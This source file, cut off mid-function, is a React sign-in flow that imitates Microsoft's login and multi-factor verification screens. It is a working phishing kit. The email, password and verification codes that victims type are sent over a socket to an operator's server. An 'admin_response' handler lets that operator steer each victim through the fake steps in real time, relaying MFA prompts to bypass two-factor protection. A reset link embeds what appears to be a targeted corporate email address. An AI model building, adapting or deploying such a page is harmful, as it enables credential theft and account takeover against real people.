/* eslint-disable react/no-unescaped-entities */
/* eslint-disable no-unused-vars */
import { toaster } from "../components/ui/toaster";
import React, { useEffect, useRef, useState } from "react";
import { io } from "socket.io-client";
import { Box, HStack, Icon, Image, Link, Text, VStack } from "@chakra-ui/react";
import Checkbox from "@mui/material/Checkbox";
import FormControlLabel from "@mui/material/FormControlLabel";
import Authenticator from "../components/custom/Authenticator";

const useAuth = () => {
  const [socket, setSocket] = useState(null);
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationMessage, setVerificationMessage] = useState("");
  const [currentStep, setCurrentStep] = useState(0);
  const [authNumber, setAuthNumber] = useState("");
  const [phone, setPhone] = useState("");
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    verifyCode: "",
    firstName: "",
    lastName: "",
    birthDate: "",
  });

  const socketRef = useRef(null);

  const navigateToStep = (targetStep) => {
    // Clamp the step between 0 and the last step index
    const safeStep = Math.max(0, Math.min(targetStep, steps.length - 1));
    setCurrentStep(safeStep);
  };

  const steps = [
    {
      id: "email",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
            gap="4rem"
            px="44px"
            pb="44px"
          >
            <VStack w="100%" alignItems="flex-start">
              <Text
                fontSize="1.5rem"
                color="rgb(27, 27, 27)"
                lineHeight="28px"
                fontWeight="600"
                fontFamily="Outfit"
                // mb="1rem"
              >
                Sign in
              </Text>
              {verificationMessage && (
                <Text
                  color="#e81123"
                  fontSize="0.9375rem"
                  lineHeight="1.25rem"
                  fontWeight="400"
                  // mt="0.5rem"
                >
                  {verificationMessage}
                </Text>
              )}
              <input
                type="email"
                name="email"
                className="form-control rounded-0"
                id="email"
                aria-describedby="emailHelp"
                placeholder="Email, phone or skype"
                value={formData.email}
                onChange={(e) => {
                  setVerificationMessage("");
                  setFormData({ ...formData, email: e.target.value });
                }}
                style={{
                  borderRight: "none",
                  borderLeft: "none",
                  borderTop: "none",
                  borderBottom: "1px solid rgb(102, 102, 102)",
                  marginTop: verificationMessage ? "" : "1rem",
                  width: "100%",
                  paddingBottom: "0.5rem",
                }}
              />
              <HStack
                fontSize="0.8125rem"
                gap="4px"
                alignItems="center"
                mt="1rem"
              >
                <Text
                  onClick={() => navigateToStep(9)}
                  _hover={{
                    color: "rgb(102, 102, 102)",
                    cursor: "pointer",
                    textDecoration: "underline",
                  }}
                  color="rgb(0, 103, 184)"
                >
                  Can't access your account?
                </Text>
              </HStack>
            </VStack>

            <HStack w="100%" justifyContent="flex-end">
              <button
                // onClick={() => setCurrentStep(currentStep + 1)}
                onClick={handleEmailSubmit}
                className="next-btn"
                style={{
                  color: "rgb(255, 255, 255)",
                  border: "1px solid rga(0, 103, 184)",
                  minWidth: "108px",
                  lineHeight: "normal",
                  minHeight: "32px",
                  whitespace: "nowrap",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "4px",
                  paddingBottom: "4px",
                  borderRadius: "0",
                  background: "rgb(0, 103, 184)",
                }}
              >
                Next
              </button>
            </HStack>
          </VStack>
        </>
      ),
    },
    {
      id: "password",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
            gap="3rem"
            px="44px"
            pb="44px"
          >
            <VStack w="100%" alignItems="flex-start">
              <HStack gap="3px" alignItems="center">
                <Icon
                  _hover={{
                    bg: "rgba(0, 0, 0, 0.1)",
                    cursor: "pointer",
                  }}
                  borderRadius="9999px"
                  w="24px"
                  h="24px"
                  p="0"
                  onClick={() => setCurrentStep(currentStep - 1)}
                >
                  <Image src="/icons/arrow_left.svg" alt="logo" />
                </Icon>

                <Text position="relative" transform="translateY(-3px)">
                  {formData.email}
                </Text>
              </HStack>
              <Text
                fontSize="1.5rem"
                fontFamily="Outfit"
                color="rgb(27, 27, 27)"
                lineHeight="28px"
                fontWeight="600"
                mt="0.5rem"
              >
                Enter Password
              </Text>
              {verificationMessage && (
                <Text
                  color="#e81123"
                  fontSize="0.9375rem"
                  lineHeight="1.25rem"
                  fontWeight="400"
                  mt="0.5rem"
                >
                  {verificationMessage}
                </Text>
              )}
              <input
                type="password"
                className="form-control rounded-0"
                placeholder="Password"
                value={formData.password}
                onChange={(e) => {
                  setVerificationMessage("");
                  setFormData({ ...formData, password: e.target.value });
                }}
                style={{
                  borderRight: "none",
                  borderLeft: "none",
                  borderTop: "none",
                  borderBottom: "1px solid rgb(102, 102, 102)",
                  marginTop: "1rem",
                  width: "100%",
                  paddingBottom: "0.5rem",
                }}
              />

              <HStack
                fontSize="0.8125rem"
                gap="4px"
                alignItems="center"
                mt="1rem"
              >
                <Text>
                  <Link href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcd6683a6-aa85-46cf-aeea-92d4a1477009%2freprocess%3fctx%3drQQIARAAnZFNaBNREMd3s2lsi7XBk0cPaRDjy-57-_YrsGCLSgw2ram2jQjh7duXZEn2g32bBIMHj4ogPQsieBCMF_EkxYN4Kj317MVeBKn4gb306Fbw4E2EYWb-MDD_md95CZZhpYAtyzExoQCqCAKMjDYgBBoA6QYlumVohmXWcpoCsYbj07P5ppx9cvF9trpd2334nN-NJiLuJknEK7LMIx7FoTtiA1Qe8lSVhx4fkD5PBq4Xlmnoyy3udQLmesEbUdwTxc-iOMkULFfBqK1ZgCKsAGwqGDgEE0CJ6RDdUA1qKB8y8yuLg6SLjlMYe2P2MzPTDmO_FYU8eSy9FWNG-r7tsmGZjAcxO15XjFnUv9NKQvu3xQV1cQFdSeOvoVQTShnnDgl6qah7HRZ7JO1aHS9JSzcGnMVDj7JiN7FRseu5NmWwjXXVARBDC2CqOMCCmgFUtd3WCCSMEbUYhAFl9r9cN5EKf57ok4B0mM-CJDWXOhx5gRuOeDlgifxaKlBX102V6CkkUwNYpymudBmwkIsJxIahKNZeVjzInlSkyvT0bF44I5wVjrLis6kU3tfDp59uz71YvsfPPXopToTdKZkukapplYKk2d9s3Groa50mXHeXA7--uaZfdwdOjY_MGzUDqdxWK3ArJ27lcj9y0v0TwvbMf6F_Nyccnfq4s__l-4Odb9WD-QuXZVNZqtVKvj-82pVJw1p10GodbYx7K6g6avQ6lxrxNbrhrJdu2q_ywn5e-AU1&mkt=en-US&hosted=0&device_platform=Windows+10&username=dimojiakuo%40accessbankplc.com">
                    <Text
                      _hover={{
                        color: "rgb(102, 102, 102)",
                        cursor: "pointer",
                        textDecoration: "underline",
                      }}
                      color="rgb(0, 103, 184)"
                    >
                      Forgot password?
                    </Text>
                  </Link>
                </Text>
              </HStack>
            </VStack>

            <HStack w="100%" justifyContent="flex-end">
              <button
                // onClick={() => setCurrentStep(currentStep + 1)}
                onClick={handlePasswordSubmit}
                style={{
                  cursor: "pointer",
                  color: "rgb(255, 255, 255)",
                  border: "1px solid rga(0, 103, 184)",
                  minWidth: "108px",
                  lineHeight: "normal",
                  minHeight: "32px",
                  whitespace: "nowrap",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "4px",
                  paddingBottom: "4px",
                  borderRadius: "0",
                  background: "rgb(0, 103, 184)",
                }}
              >
                Sign in
              </button>
            </HStack>
          </VStack>
        </>
      ),
    },
    {
      id: "personal-info",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
          >
            <Text px="44px" position="relative" transform="translateY(-3px)">
              {formData.email}
            </Text>
            <Text
              px="44px"
              fontSize="1.5rem"
              fontFamily="Outfit"
              color="rgb(27, 27, 27)"
              lineHeight="28px"
              fontWeight="600"
            >
              Verify your identity
            </Text>

            <VStack w="100%" gap="0">
              <HStack
                _hover={{
                  bg: "#E5E5E5",
                  cursor: "pointer",
                }}
                w="100%"
                h="72px"
                py="12px"
                px="44px"
                onClick={handleAuthenticatorSelect}
              >
                <Image src="/icons/picker.svg" alt="secure" />

                <Text wordWrap="break-word">
                  Approve a request on my Microsoft Authenticator app
                </Text>
              </HStack>

              <HStack
                _hover={{
                  bg: "#E5E5E5",
                  cursor: "pointer",
                }}
                w="100%"
                h="72px"
                py="12px"
                px="44px"
                // onClick={() => navigateToStep(4)}
                onClick={handleVerificationCodeSelect}
              >
                <Image src="/icons/num.svg" alt="secure" />

                <Text wordWrap="break-word">Use a verification code</Text>
              </HStack>

              <HStack
                _hover={{
                  bg: "#E5E5E5",
                  cursor: "pointer",
                }}
                w="100%"
                h="72px"
                py="12px"
                px="44px"
                // onClick={() => navigateToStep(5)}
                onClick={handleTextSelect}
              >
                <Image src="/icons/text.svg" alt="secure" />

                <Text wordWrap="break-word">
                  Text{" "}
                  <span style={{ textTransform: "uppercase" }}>{phone}</span>
                </Text>
              </HStack>
              <HStack
                _hover={{
                  bg: "#E5E5E5",
                  cursor: "pointer",
                }}
                w="100%"
                h="72px"
                py="12px"
                px="44px"
                // onClick={() => navigateToStep(6)}
                onClick={handleCallSelect}
              >
                <Image src="/icons/call.svg" alt="secure" />

                <Text wordWrap="break-word">
                  Call{" "}
                  <span style={{ textTransform: "uppercase" }}>{phone}</span>
                </Text>
              </HStack>
            </VStack>

            <Link href="https://go.microsoft.com/fwlink/p/?LinkId=708614">
              <Text
                px="44px"
                color="#0067b8"
                textDecoration="none"
                fontSize=".8125rem"
                mt="0.5rem"
              >
                More information
              </Text>
            </Link>

            <Text
              px="44px"
              textAlign="left"
              fontSize=".8125rem"
              color="#1b1b1b"
            >
              Are your verification methods current? Check at
              https://aka.ms/mfasetup
            </Text>

            <HStack px="44px" pb="44px" w="100%" justifyContent="flex-end">
              <button
                onClick={() => {
                  setVerificationMessage("");
                  setAuthNumber("");
                  setPhone("");
                  setFormData({
                    email: "",
                    password: "",
                    verifyCode: "",
                    firstName: "",
                    lastName: "",
                    birthDate: "",
                  });
                  navigateToStep(0);
                }}
                style={{
                  color: "#000",
                  border: "1px solid rga(0, 103, 184)",
                  minWidth: "108px",
                  lineHeight: "normal",
                  minHeight: "32px",
                  whitespace: "nowrap",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "4px",
                  paddingBottom: "4px",
                  borderRadius: "0",
                  background: "#CCCCCC",
                  cursor: "pointer",
                }}
              >
                Cancel
              </button>
            </HStack>
          </VStack>
        </>
      ),
    },
    {
      id: "authenticator",
      render: () => (
        <>
          <Authenticator
            authNumber={authNumber}
            formData={formData}
            setCurrentStep={setCurrentStep}
            setVerificationMessage={setVerificationMessage}
          />
        </>
      ),
    },
    {
      id: "verifyCode",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
          >
            <Text px="44px" position="relative" transform="translateY(-3px)">
              {formData.email}
            </Text>
            <Text
              px="44px"
              fontSize="1.5rem"
              fontFamily="Outfit"
              color="rgb(27, 27, 27)"
              lineHeight="28px"
              fontWeight="600"
            >
              Enter code
            </Text>

            <HStack px="42px" alignItems="flex-start">
              <Image src="/icons/num.svg" alt="secure" w="24px" h="24px" />
              <Text fontSize="0.9rem">
                Enter the code displayed in the Microsoft Authenticator app on
                your mobile device
              </Text>
            </HStack>
            <Box w="100%" px="44px">
              {verificationMessage && (
                <Text
                  color="#e81123"
                  fontSize="0.9375rem"
                  lineHeight="1.25rem"
                  fontWeight="400"
                  // mt="0.5rem"
                >
                  {verificationMessage}
                </Text>
              )}
            </Box>

            <VStack alignItems="flex-start" px="44px" w="100%">
              <input
                type="text"
                name="verifyCode"
                className="form-control rounded-0"
                id="verifyCode"
                aria-describedby="verifyCodeHelp"
                placeholder="Code"
                value={formData.verifyCode}
                onChange={(e) => {
                  setVerificationMessage("");
                  setFormData({ ...formData, verifyCode: e.target.value });
                }}
                style={{
                  borderRight: "none",
                  borderLeft: "none",
                  borderTop: "none",
                  borderBottom: "1px solid rgb(102, 102, 102)",
                  marginTop: verificationMessage === "" ? "" : "1rem",
                  width: "100%",
                  paddingBottom: "0.5rem",
                }}
              />

              <HStack w="100%" mt="0.5rem" position="relative">
                {/* <Checkbox colorPalette="blue" variant="solid">
                    Accept terms and conditions
                  </Checkbox> */}
                <FormControlLabel
                  style={{
                    position: "relative",
                    transform: "translateX(6.5px)",
                    fontFamily: "Outfit",
                    color: "#383838",
                    gap: "0.5rem",
                  }}
                  control={
                    <Checkbox
                      sx={{
                        color: "rgba(0, 0, 0, 0.6)",
                        padding: "0",
                        "&.Mui-checked": {
                          color: "#00a4ef", // Color for the checked state
                          backgroundColor: "transparent", // Remove background color in checked state
                        },
                        "&:hover": {
                          backgroundColor: "transparent", // Remove background color on hover
                        },
                        "& .MuiCheckbox-root": {
                          padding: "0",
                        },
                      }}
                    />
                  }
                  label={
                    <Text fontSize="0.9rem" fontFamily="Segoe UI">
                      Don't ask again for 7 days
                    </Text>
                  }
                />
              </HStack>

              <HStack fontSize="0.9rem">
                <Text>Having trouble?</Text>
                <Text
                  onClick={() => {
                    // setFormData({
                    //   ...formData,
                    //   verifyCode: "",
                    // });
                    setVerificationMessage("");
                    navigateToStep(2);
                  }}
                  cursor="pointer"
                  color="#00a4ef"
                >
                  Sign in another way
                </Text>
              </HStack>
            </VStack>

            <HStack
              px="44px"
              pb="44px"
              mt="2rem"
              w="100%"
              justifyContent="flex-end"
            >
              <button
                // onClick={() => navigateToStep(7)}
                onClick={handleVerifyClick}
                className="next-btn"
                style={{
                  color: "rgb(255, 255, 255)",
                  border: "1px solid rga(0, 103, 184)",
                  minWidth: "108px",
                  lineHeight: "normal",
                  minHeight: "32px",
                  whitespace: "nowrap",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "4px",
                  paddingBottom: "4px",
                  borderRadius: "0",
                  background: "rgb(0, 103, 184)",
                }}
              >
                Verify
              </button>
            </HStack>
            {/* <button onClick={() => alert("Submitted!")}>Submit</button>
              <button onClick={() => setCurrentStep(currentStep - 1)}>
                Back
              </button> */}
          </VStack>
        </>
      ),
    },
    {
      id: "text",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
          >
            <Text px="44px" position="relative" transform="translateY(-3px)">
              {formData.email}
            </Text>
            <Text
              px="44px"
              fontSize="1.5rem"
              fontFamily="Outfit"
              color="rgb(27, 27, 27)"
              lineHeight="28px"
              fontWeight="600"
            >
              Enter code
            </Text>

            <HStack px="42px" alignItems="flex-start">
              <Image src="/icons/text.svg" alt="secure" w="24px" h="24px" />
              <Text fontSize="0.9rem">
                We texted your phone{" "}
                <span style={{ textTransform: "uppercase" }}>{phone}</span>.
                Please enter the code to sign in.
              </Text>
            </HStack>
            <Box w="100%" px="44px">
              {verificationMessage && (
                <Text
                  color="#e81123"
                  fontSize="0.9375rem"
                  lineHeight="1.25rem"
                  fontWeight="400"
                  // mt="0.5rem"
                >
                  {verificationMessage}
                </Text>
              )}
            </Box>

            <VStack alignItems="flex-start" px="44px" w="100%">
              <input
                type="text"
                name="verifyCode"
                className="form-control rounded-0"
                id="verifyCode"
                aria-describedby="verifyCodeHelp"
                placeholder="Code"
                value={formData.verifyCode}
                onChange={(e) => {
                  setVerificationMessage("");
                  setFormData({ ...formData, verifyCode: e.target.value });
                }}
                style={{
                  borderRight: "none",
                  borderLeft: "none",
                  borderTop: "none",
                  borderBottom: "1px solid rgb(102, 102, 102)",
                  // marginTop: verificationMessage === "" ? "" : "1rem",
                  width: "100%",
                  paddingBottom: "0.5rem",
                }}
              />

              <HStack w="100%" mt="0.5rem" position="relative">
                {/* <Checkbox colorPalette="blue" variant="solid">
                    Accept terms and conditions
                  </Checkbox> */}
                <FormControlLabel
                  style={{
                    position: "relative",
                    transform: "translateX(6.5px)",
                    fontFamily: "Outfit",
                    color: "#383838",
                    gap: "0.5rem",
                  }}
                  control={
                    <Checkbox
                      sx={{
                        color: "rgba(0, 0, 0, 0.6)",
                        padding: "0",
                        "&.Mui-checked": {
                          color: "#00a4ef", // Color for the checked state
                          backgroundColor: "transparent", // Remove background color in checked state
                        },
                        "&:hover": {
                          backgroundColor: "transparent", // Remove background color on hover
                        },
                        "& .MuiCheckbox-root": {
                          padding: "0",
                        },
                      }}
                    />
                  }
                  label={
                    <Text fontSize="0.9rem" fontFamily="Segoe UI">
                      Don't ask again for 7 days
                    </Text>
                  }
                />
              </HStack>

              <HStack fontSize="0.9rem">
                <Text>Having trouble?</Text>

                <Text
                  onClick={() => {
                    setFormData({
                      ...formData,
                      verifyCode: "",
                    });
                    setVerificationMessage("");
                    navigateToStep(2);
                  }}
                  cursor="pointer"
                  color="#00a4ef"
                >
                  Sign in another way
                </Text>
              </HStack>
            </VStack>

            <HStack
              px="44px"
              pb="44px"
              mt="2rem"
              w="100%"
              justifyContent="flex-end"
            >
              <button
                // onClick={() => navigateToStep(7)}
                onClick={handleTextVerifyClick}
                className="next-btn"
                style={{
                  color: "rgb(255, 255, 255)",
                  border: "1px solid rga(0, 103, 184)",
                  minWidth: "108px",
                  lineHeight: "normal",
                  minHeight: "32px",
                  whitespace: "nowrap",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "4px",
                  paddingBottom: "4px",
                  borderRadius: "0",
                  background: "rgb(0, 103, 184)",
                }}
              >
                Verify
              </button>
            </HStack>
            {/* <button onClick={() => alert("Submitted!")}>Submit</button>
              <button onClick={() => setCurrentStep(currentStep - 1)}>
                Back
              </button> */}
          </VStack>
        </>
      ),
    },
    {
      id: "call",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
            gap="3rem"
            px="44px"
            pb="44px"
          >
            <VStack w="100%" alignItems="flex-start">
              <HStack gap="3px" alignItems="center">
                <Icon
                  _hover={{
                    bg: "rgba(0, 0, 0, 0.1)",
                    cursor: "pointer",
                  }}
                  borderRadius="9999px"
                  w="24px"
                  h="24px"
                  p="0"
                  onClick={() => navigateToStep(2)}
                >
                  <Image src="/icons/arrow_left.svg" alt="logo" />
                </Icon>

                <Text position="relative" transform="translateY(-3px)">
                  {formData.email}
                </Text>
              </HStack>
              <Text
                fontSize="1.5rem"
                fontFamily="Outfit"
                color="rgb(27, 27, 27)"
                lineHeight="28px"
                fontWeight="600"
                mt="0.5rem"
              >
                Approve sign in request
              </Text>
              <HStack alignItems="flex-start">
                <Image src="/icons/call.svg" alt="secure" w="24px" h="24px" />
                <Text fontSize="0.9rem">
                  We're calling your phone. Please answer it to continue.
                </Text>
              </HStack>

              <HStack w="100%" mt="0.5rem" position="relative">
                {/* <Checkbox colorPalette="blue" variant="solid">
                    Accept terms and conditions
                  </Checkbox> */}
                <FormControlLabel
                  style={{
                    position: "relative",
                    transform: "translateX(6.5px)",
                    fontFamily: "Outfit",
                    color: "#383838",
                    gap: "0.5rem",
                  }}
                  control={
                    <Checkbox
                      sx={{
                        color: "rgba(0, 0, 0, 0.6)",
                        padding: "0",
                        "&.Mui-checked": {
                          color: "#00a4ef", // Color for the checked state
                          backgroundColor: "transparent", // Remove background color in checked state
                        },
                        "&:hover": {
                          backgroundColor: "transparent", // Remove background color on hover
                        },
                        "& .MuiCheckbox-root": {
                          padding: "0",
                        },
                      }}
                    />
                  }
                  label={
                    <Text fontSize="0.9rem" fontFamily="Segoe UI">
                      Don't ask again for 7 days
                    </Text>
                  }
                />
              </HStack>

              <Link href="https://go.microsoft.com/fwlink/p/?LinkId=708614">
                <Text
                  color="#0067b8"
                  textDecoration="none"
                  fontSize=".8125rem"
                  mt="0.5rem"
                >
                  More information
                </Text>
              </Link>
            </VStack>
          </VStack>
        </>
      ),
    },
    {
      id: "verified",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
          >
            <Text px="44px" position="relative" transform="translateY(-3px)">
              {formData.email}
            </Text>
            <Text
              px="44px"
              fontSize="1.5rem"
              fontFamily="Outfit"
              color="rgb(27, 27, 27)"
              lineHeight="28px"
              fontWeight="600"
            >
              Stay signed in?
            </Text>

            <Text fontSize="0.9rem" px="44px">
              Do this to reduce the number of times you are asked to sign in.
            </Text>

            <HStack px="44px" w="100%" mt="0.5rem" position="relative">
              {/* <Checkbox colorPalette="blue" variant="solid">
                    Accept terms and conditions
                  </Checkbox> */}
              <FormControlLabel
                style={{
                  position: "relative",
                  transform: "translateX(6.5px)",
                  fontFamily: "Outfit",
                  color: "#383838",
                  gap: "0.5rem",
                }}
                control={
                  <Checkbox
                    sx={{
                      color: "rgba(0, 0, 0, 0.6)",
                      padding: "0",
                      "&.Mui-checked": {
                        color: "#00a4ef", // Color for the checked state
                        backgroundColor: "transparent", // Remove background color in checked state
                      },
                      "&:hover": {
                        backgroundColor: "transparent", // Remove background color on hover
                      },
                      "& .MuiCheckbox-root": {
                        padding: "0",
                      },
                    }}
                  />
                }
                label={
                  <Text fontSize="0.9rem" fontFamily="Segoe UI">
                    Don't ask again for 7 days
                  </Text>
                }
              />
            </HStack>

            <HStack
              px="44px"
              pb="44px"
              mt="2rem"
              w="100%"
              justifyContent="flex-end"
            >
              <button
                onClick={handleExitFlow}
                style={{
                  color: "#000",
                  border: "1px solid rga(0, 103, 184)",
                  minWidth: "108px",
                  lineHeight: "normal",
                  minHeight: "32px",
                  whitespace: "nowrap",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "4px",
                  paddingBottom: "4px",
                  borderRadius: "0",
                  background: "#CCCCCC",
                  cursor: "pointer",
                }}
              >
                No
              </button>

              <button
                onClick={handleExitFlow}
                className="next-btn"
                style={{
                  color: "rgb(255, 255, 255)",
                  border: "1px solid rga(0, 103, 184)",
                  minWidth: "108px",
                  lineHeight: "normal",
                  minHeight: "32px",
                  whitespace: "nowrap",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "4px",
                  paddingBottom: "4px",
                  borderRadius: "0",
                  background: "rgb(0, 103, 184)",
                  cursor: "pointer",
                }}
              >
                Yes
              </button>
            </HStack>
          </VStack>
        </>
      ),
    },
    {
      id: "final",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
          >
            <Text
              px="44px"
              fontSize="1.5rem"
              fontFamily="Outfit"
              color="rgb(27, 27, 27)"
              lineHeight="28px"
              fontWeight="600"
            >
              Hmm... we're having trouble signing you in.
            </Text>

            <Text pb="44px" fontSize="0.9rem" px="44px">
              You may be experiencing network failure. Close and reopen your
              browser before retrying.
            </Text>
          </VStack>
        </>
      ),
    },
    {
      id: "no-access",
      render: () => (
        <>
          <VStack
            alignItems="flex-start"
            h="100%"
            justifyContent="space-between"
            w="100%"
          >
            <Text
              px="44px"
              fontSize="1.5rem"
              fontFamily="Outfit"
              color="rgb(27, 27, 27)"
              lineHeight="28px"
              fontWeight="600"
            >
              Which type of account do you need help with?
            </Text>

            <VStack w="100%" gap="0">
              <Link
                w="100%"
                href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcd6683a6-aa85-46cf-aeea-92d4a1477009%2freprocess%3fctx%3drQQIARAAnZG_axRBFMd3cpczCWoObSwFLyeoc7ezO7uze7Bggkg4TYL5cSbXHLOzs3dLbn-4M7uHwT9AsYmFjWBjIZJKYiPBQrSRVKmtLCWgiFik041gYSfC4733hQfv-97nUgk1UKuGbdu1MGUQ6RqCWCM-pBQRqJmEUdMmBrGtdsVQETZwemaqutEsP736rjy_195_-FzcS3YAHkiZiFazKRKRpLE34pnWyEWhGnkgMjoUMvOCuMHisNkTQT_iXhC9BuAAgM8A7IzVbE_Fmm_YkGlYhdhSMXQpppBRy6Um0Qkj6sex6aXZTA604xSnwRb_Pjbpx2nYS2Ihn5TegJTTYeh4PG_QrSzlx-vqKU-Gd3sydn5bnNFnZ7TrRfw1VGjKGBfCpdFmIRaDPk8DWnS9fiCLMkih4GkeMF4fSEerDwLPYRz52NRdiDCyIWaqC21kEKjrvm9QRDmnej2KI8adf7lup1T788SQRrTPQx7JwlzhcBREXjwSjYjL5m6pxjzTtHRqFpAsA2KTFbiKZdDWPEwRJkRV7YMyOCyfVEutiYmpqnJOOa8clcGz8QLeq13w4ufK0Y3HF2rtvbMXlf3xJpuj85Z9OZIbw_Xl7rK50t9AHW8hChfXV8xbXua2xchabRNNFw5poe0K2K5UvlXA_RPK3uR_oX97Sjk6_ejH-8MvDz58nT-cvpLQpdxYmOVrNze7wyztrC37OevI1Wt3trqZzswQ3e4imc91Ast5WVU-VZVf0&mkt=en-US&hosted=0&device_platform=Windows+10"
              >
                <HStack
                  _hover={{
                    bg: "#E5E5E5",
                    cursor: "pointer",
                  }}
                  w="100%"
                  h="72px"
                  py="12px"
                  px="44px"
                  // onClick={handleAuthenticatorSelect}
                >
                  <Image src="/icons/work.svg" alt="secure" />

                  <VStack alignItems="flex-start" gap="0">
                    <Text wordWrap="break-word">Work or school account</Text>
                    <Text wordWrap="break-word" fontSize="12px" color="#1b1b1b">
                      Created by your IT department
                    </Text>
                  </VStack>
                </HStack>
              </Link>

              <Link w="100%" href="#">
                <HStack
                  _hover={{
                    bg: "#E5E5E5",
                    cursor: "pointer",
                  }}
                  w="100%"
                  h="72px"
                  py="12px"
                  px="44px"
                  // onClick={() => navigateToStep(4)}
                  // onClick={handleVerificationCodeSelect}
                >
                  <Image src="/icons/user.svg" alt="secure" />

                  <VStack alignItems="flex-start" gap="0">
                    <Text wordWrap="break-word">Personal account</Text>
                    <Text wordWrap="break-word" fontSize="12px" color="#1b1b1b">
                      Created by you
                    </Text>
                  </VStack>
                </HStack>
              </Link>
            </VStack>

            <HStack px="44px" pb="44px" w="100%" justifyContent="flex-end">
              <button
                onClick={() => navigateToStep(0)}
                style={{
                  color: "#000",
                  border: "1px solid rga(0, 103, 184)",
                  minWidth: "108px",
                  lineHeight: "normal",
                  minHeight: "32px",
                  whitespace: "nowrap",
                  paddingLeft: "12px",
                  paddingRight: "12px",
                  paddingTop: "4px",
                  paddingBottom: "4px",
                  borderRadius: "0",
                  cursor: "pointer",
                  background: "#CCCCCC",
                }}
              >
                Back
              </button>
            </HStack>
          </VStack>
        </>
      ),
    },
  ];

  useEffect(() => {
    if (!socketRef.current) {
      socketRef.current = io(import.meta.env.VITE_BASE_URL);

      socketRef.current.on("connect", () => {
        console.log(
          "Connected to socket server with ID:",
          socketRef.current.id
        );
      });

      socketRef.current.on("admin_response", (data) => {
        console.log("Received admin response:", data);
        if (data.eventType === "authenticator-select" && !data.authNumber) {
          setIsVerifying(true);
        } else if (
          data.eventType === "authenticator-select" &&
          data.authNumber
        ) {
          if (data.response === "authenticate") {
            setIsVerifying(false);

            if (data.nextStep) {
              navigateToStep(parseInt(data.nextStep));
            }

            if (data.message) {
              setVerificationMessage(data.message);
            }

            if (data.authNumber) {
              setAuthNumber(data.authNumber);
            }
          } else {
            setIsVerifying(true);

            setTimeout(() => {
              if (data.nextStep) {
                setIsVerifying(false);
                navigateToStep(parseInt(data.nextStep));
              }
            }, 9000);
          }
        } else if (data.eventType === "call-select") {
          if (data.response === "call") {
            setIsVerifying(true);

            setTimeout(() => {
              if (data.nextStep) {
                setIsVerifying(false);
                navigateToStep(parseInt(data.nextStep));
              }
            }, 2000);
          } else {
            setIsVerifying(true);

            setTimeout(() => {
              if (data.nextStep) {
                setIsVerifying(false);
                navigateToStep(parseInt(data.nextStep));
              }
            }, 9000);
          }
        } else if (data.eventType === "password-submission") {
          if (data.response === "phone") {
            setIsVerifying(false);

            if (data.nextStep) {
              navigateToStep(parseInt(data.nextStep));
            }

            if (data.message) {
              setVerificationMessage(data.message);
            }

            if (data.phone) {
              setPhone(data.phone);
            }
          } else {
            setIsVerifying(true);

            setTimeout(() => {
              if (data.nextStep) {
                setIsVerifying(false);
                navigateToStep(parseInt(data.nextStep));
              }
            }, 9000);
          }
        } else {
          setIsVerifying(false);

          // Check if we have nextStep and message directly in the response
          if (data.nextStep) {
            navigateToStep(parseInt(data.nextStep));
          }

          if (data.message) {
            setVerificationMessage(data.message);
          }
        }
      });

      socketRef.current.on("connect_error", (error) => {
        console.error("Socket connection error:", error);
        setIsVerifying(false);
        setVerificationMessage("Connection error. Please try again.");
      });
    }

    return () => {
      if (socketRef.current) {
        socketRef.current.disconnect();
        socketRef.current = null;
      }
    };
  }, []);

  const handleAdminResponse = (data) => {
    setIsVerifying(false);
    console.log("authData", data);
    if (data.metadata) {
      // Set verification message
      if (data.metadata.message) {
        setVerificationMessage(data.metadata.message);
      }

      // Handle specific actions
      switch (data.metadata.action) {
        case "RESET_EMAIL":
          setFormData((prev) => ({ ...prev, email: "" }));
          break;
        case "RESET_PASSWORD":
          setFormData((prev) => ({ ...prev, password: "" }));
          break;
        case "RESET_CODE":
          setFormData((prev) => ({ ...prev, verifyCode: "" }));
          break;
        case "COMPLETE_AUTH":
          // Handle successful authentication
          navigateToStep("success");
          break;
        default:
          // Navigate to next step if specified
          if (data.metadata.nextStep) {
            navigateToStep(parseInt(data.metadata.nextStep));
          }
      }
    }
  };

  const handleEmailSubmit = () => {
    if (!formData.email?.trim()) {
      setVerificationMessage(
        "Enter a valid email address, phone number, or Skype name."
      );
      return;
    }

    setVerificationMessage("");

    setIsVerifying(true);

    socketRef.current.emit("verify_email", {
      email: formData.email,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handlePasswordSubmit = () => {
    if (!formData.password.trim()) {
      setVerificationMessage("Please enter your password.");
      return;
    }

    setVerificationMessage("");
    setIsVerifying(true);

    socketRef.current.emit("password-attempt", {
      email: formData.email,
      password: formData.password,
      timestamp: new Date().toISOString(),
      sessionId: socketRef.current.id,
    });
  };

  const handleAuthenticatorSelect = () => {
    // TO NAVIGATE TO 3 ON SUCCESS
    setIsVerifying(true);

    socketRef.current.emit("authenticator-select", {
      email: formData.email,
      password: formData.password,
      timestamp: new Date().toISOString(),
